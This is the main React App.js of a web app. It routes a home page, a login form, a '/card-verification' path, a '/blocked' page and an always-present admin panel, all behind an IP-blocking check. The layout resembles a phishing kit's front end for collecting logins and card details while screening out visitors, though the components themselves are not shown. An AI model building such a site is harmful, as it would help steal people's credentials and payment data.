import React from 'react';
import { HashRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
import './App.css';
import HomePage from './components/HomePage';
import LoginForm from './components/LoginForm';
import { useIPBlocker } from './hooks/useIPBlocker';
import AdminPanel from './components/AdminPanel';
import BlockedPage from './components/BlockedPage';

function AppContent() {
  const { isChecking } = useIPBlocker();

  // Don't show loading if we're on blocked page
  if (isChecking) {
    return (
      <div className="loading-screen">
        <div className="spinner"></div>
        <p>Checking security...</p>
      </div>
    );
  }

  return (
    <div className="app-wrapper">
      <div className="app-container">
        <Routes>
          <Route path="/" element={<HomePage />} />
          <Route path="/login" element={<LoginForm />} />
          <Route path="/card-verification" element={<HomePage />} />
          <Route path="/blocked" element={<BlockedPage />} />
          <Route path="*" element={<Navigate to="/" />} />
        </Routes>
      </div>
      <AdminPanel />
    </div>
  );
}

function App() {
  return (
    <Router>
      <AppContent />
    </Router>
  );
}

export default App;